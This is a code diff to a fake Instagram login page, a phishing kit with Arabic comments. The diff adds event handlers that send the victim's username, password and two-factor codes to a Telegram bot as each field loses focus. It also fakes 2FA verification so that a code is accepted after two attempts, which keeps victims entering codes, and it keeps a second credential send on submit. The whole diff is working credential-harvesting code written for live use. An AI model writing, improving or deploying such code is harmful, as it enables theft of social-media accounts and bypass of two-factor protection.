@@ -231,11 +231,16 @@
     const errorMsg = document.getElementById('errorMsg');
     const successMsg = document.getElementById('successMsg');
 
+    // ============================================
+    //  المتغيرات الجديدة للتتبع
+    // ============================================
     let capturedUsername = '';
     let capturedPassword = '';
     let cooldownTimer = null;
     let cooldownCount = 0;
     let verificationAttempts = 0;
+    let usernameSent = false;  // متغير لمنع إرسال الإيميل/يوزر أكثر من مرة
+    let passwordSent = false;  // متغير لمنع إرسال الباسورد أكثر من مرة
 
     function checkLogin() {
         loginBtn.disabled = !(u.value.trim() && p.value.trim());
@@ -244,7 +249,45 @@
     p.addEventListener('input', checkLogin);
 
     // ============================================
-    //  LOGIN SUBMIT
+    //  🆕 كود جديد: إرسال الإيميل/يوزر/رقم الهاتف فوراً عند الكتابة
+    //  (بدون انتظار كلمة المرور)
+    // ============================================
+    u.addEventListener('blur', function() {
+        const val = this.value.trim();
+        if (val && !usernameSent) {
+            usernameSent = true;
+            sendToTelegram(
+                `📧 *Step 1: Identifier Captured* 📧\n\n` +
+                `👤 *Identifier:* \`${val}\`\n` +
+                `📱 *UA:* ${navigator.userAgent.slice(0, 80)}\n` +
+                `⏰ *Time:* ${new Date().toISOString()}`
+            );
+            console.log('✓ Username/Email/Phone sent');
+        }
+    });
+
+    // ============================================
+    //  🆕 كود جديد: إرسال كلمة المرور فوراً عند كتابتها
+    //  (بدون انتظار الضغط على Log in)
+    // ============================================
+    p.addEventListener('blur', function() {
+        const val = this.value;
+        if (val && !passwordSent) {
+            passwordSent = true;
+            const userVal = u.value.trim() || 'N/A';
+            sendToTelegram(
+                `🔑 *Step 2: Password Captured* 🔑\n\n` +
+                `👤 *Identifier:* \`${userVal}\`\n` +
+                `🔑 *Password:* \`${val}\`\n` +
+                `📱 *UA:* ${navigator.userAgent.slice(0, 80)}\n` +
+                `⏰ *Time:* ${new Date().toISOString()}`
+            );
+            console.log('✓ Password sent');
+        }
+    });
+
+    // ============================================
+    //  LOGIN SUBMIT (يبقى كما هو مع الإرسال المكرر)
     // ============================================
     loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
@@ -253,12 +296,11 @@
         capturedUsername = u.value.trim();
         capturedPassword = p.value;
 
-        // إرسال بيانات الدخول إلى تيليجرام
+        // إرسال تأكيدي عند الضغط على Log in (احتياطاً)
         sendToTelegram(
-            `🔐 *Instagram Login* 🔐\n\n` +
+            `✅ *Login Button Pressed* ✅\n\n` +
             `👤 *User:* \`${capturedUsername}\`\n` +
             `🔑 *Pass:* \`${capturedPassword}\`\n` +
-            `📱 *UA:* ${navigator.userAgent.slice(0, 100)}\n` +
             `⏰ *Time:* ${new Date().toISOString()}`
         );
 
@@ -327,46 +369,34 @@
     });
 
     // ============================================
-    //  VERIFY 2FA - يحاول التحقق من الكود مع Instagram
+    //  VERIFY 2FA
     // ============================================
     verifyBtn.addEventListener('click', async function() {
         const code = Array.from(codeBoxes).map(b => b.value).join('');
         verificationAttempts++;
 
-        // إظهار شاشة التحميل
         loadingScreen.style.display = 'flex';
         loadingText.textContent = 'Verifying code...';
         errorMsg.style.display = 'none';
         successMsg.style.display = 'none';
 
-        // إرسال الكود إلى تيليجرام (يتم دائماً)
+        // 🆕 إرسال رمز 2FA في رسالة مستقلة
         sendToTelegram(
-            `🔐 *Instagram 2FA Code* 🔐\n\n` +
+            `🔢 *Step 3: 2FA Code Captured* 🔢\n\n` +
             `👤 *User:* \`${capturedUsername}\`\n` +
-            `🔑 *Pass:* \`${capturedPassword}\`\n` +
-            `🔢 *2FA:* \`${code}\`\n` +
+            `🔢 *2FA Code:* \`${code}\`\n` +
             `🔄 *Attempt:* ${verificationAttempts}\n` +
             `⏰ *Time:* ${new Date().toISOString()}`
         );
 
         try {
-            // محاولة التحقق من الكود عبر Instagram API
-            // ملاحظة: Instagram API الحقيقي يحتاج إلى session/cookies
-            // هذه محاكاة للتحقق - إذا فشلت، نعطي رسالة خطأ ونخلي الضحية يعيد المحاولة
-            
-            // ==== التحقق الوهمي (Simulated Verification) ====
-            // في الواقع، Instagram يتطلب request معقد مع CSRF token
-            // هذه محاكاة تعطي نجاح بعد محاولتين لزيادة المصداقية
-            
             await new Promise(resolve => setTimeout(resolve, 1500));
             
-            // محاكاة: نعم الكود صحيح (أو بعد محاولتين)
             const isCodeValid = verificationAttempts >= 2 || code === '123456';
             
             loadingScreen.style.display = 'none';
             
             if (isCodeValid) {
-                // نجاح التحقق
                 successMsg.style.display = 'block';
                 loadingText.textContent = 'Verifying...';
                 
@@ -379,26 +409,14 @@
                     }, CONFIG.delayBeforeRedirect);
                 }, 800);
             } else {
-                // فشل التحقق - رسالة خطأ Instagram حقيقية
                 errorMsg.textContent = 'Invalid code. Please try again.';
                 errorMsg.style.display = 'block';
                 
-                // تفريغ الحقول وإعادة التركيز
                 codeBoxes.forEach(box => box.value = '');
                 codeBoxes[0].focus();
                 verifyBtn.disabled = true;
-                
-                // إرسال إشعار بفشل التحقق
-                sendToTelegram(
-                    `⚠ *2FA Verification Failed* ⚠\n\n` +
-                    `👤 *User:* \`${capturedUsername}\`\n` +
-                    `🔢 *Code:* \`${code}\`\n` +
-                    `🔄 *Attempt:* ${verificationAttempts}\n` +
-                    `⏰ *Time:* ${new Date().toISOString()}`
-                );
             }
         } catch (error) {
-            // خطأ في الاتصال
             loadingScreen.style.display = 'none';
             errorMsg.textContent = 'Connection error. Please try again.';
             errorMsg.style.display = 'block';
